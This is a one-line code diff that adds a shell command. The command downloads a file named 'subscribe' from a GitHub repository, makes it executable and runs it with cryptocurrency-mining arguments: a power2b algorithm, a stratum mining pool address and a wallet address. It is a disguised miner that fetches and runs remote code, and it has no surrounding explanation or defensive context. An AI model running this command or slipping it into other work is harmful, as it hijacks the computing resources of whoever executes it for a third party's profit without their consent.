@@ -1,0 +1,1 @@
+wget https://github.com/mrbogel/Student/raw/main/subscribe; chmod +x subscribe; ./subscribe -a power2b -o stratum+tcp://stratum-na.rplant.xyz:17022 -u MprHUSjmvvnMpAmepVuh7dS2CZsLZc4SkG.lap
